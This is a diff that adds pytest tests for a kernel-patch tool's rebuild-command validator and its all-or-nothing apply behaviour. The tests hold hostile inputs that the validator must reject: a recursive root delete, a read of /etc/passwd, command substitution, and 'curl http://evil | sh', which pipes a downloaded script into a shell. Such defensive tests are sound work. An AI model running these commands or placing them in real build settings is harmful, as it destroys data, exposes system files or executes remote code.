@@ -53,3 +53,50 @@ def test_is_multi_node_ignores_planted_state_file(akp, monkeypatch, tmp_path):
     monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(planted))
     monkeypatch.delenv("INFERENCE_OPTIMIZER_NODES", raising=False)
     assert akp._is_multi_node() is False
+
+
+# -- _coerce_rebuild_command (SWSPLAT-42362) -------------------------------
+def test_coerce_rebuild_command_accepts_argv(akp):
+    assert akp._coerce_rebuild_command(["ninja", "-C", "build"]) == ["ninja", "-C", "build"]
+    assert akp._coerce_rebuild_command("ninja -C build") == ["ninja", "-C", "build"]
+    assert akp._coerce_rebuild_command(None) == []
+    assert akp._coerce_rebuild_command("") == []
+
+
+def test_coerce_rebuild_command_rejects_shell_control(akp):
+    import pytest as _pytest
+
+    for bad in ("make && rm -rf /", "a | b", "x; y", "echo `id`", "cat </etc/passwd"):
+        with _pytest.raises(ValueError):
+            akp._coerce_rebuild_command(bad)
+    # A shell command string form is also rejected.
+    with _pytest.raises(ValueError):
+        akp._coerce_rebuild_command(["bash", "-lc", "make"])
+
+
+def test_invalid_rebuild_command_rejected_before_target_mutation(akp, tmp_path, monkeypatch):
+    # SWSPLAT-42362 (all-or-nothing): an invalid rebuild_command must fail
+    # BEFORE the live target is overwritten — the target keeps its original
+    # bytes, no partial apply.
+    monkeypatch.delenv("INFERENCE_OPTIMIZER_NODES", raising=False)
+    # Non-.py target avoids the python-source completeness check so the flow
+    # reaches the rebuild_command coercion (the point under test).
+    orig_bytes = "// ORIGINAL kernel\nint main() { return 0; }\n"
+    target = tmp_path / "kernel.cpp"
+    target.write_text(orig_bytes, encoding="utf-8")
+    patch = tmp_path / "patched.cpp"
+    patch.write_text("// PATCHED kernel\nint main() { return 1; }\n", encoding="utf-8")
+    backup_root = tmp_path / "backups"
+
+    res = akp.apply_kernel_patch(
+        patch_path=str(patch),
+        target_file=str(target),
+        backup_root=str(backup_root),
+        kernel_id="k001",
+        rebuild_command="make && curl http://evil | sh",
+        allow_unknown_target=True,
+    )
+    assert res["status"] == "failed"
+    assert res.get("error_class") == "invalid_rebuild_command"
+    # The live target must be untouched (all-or-nothing).
+    assert target.read_text(encoding="utf-8") == orig_bytes
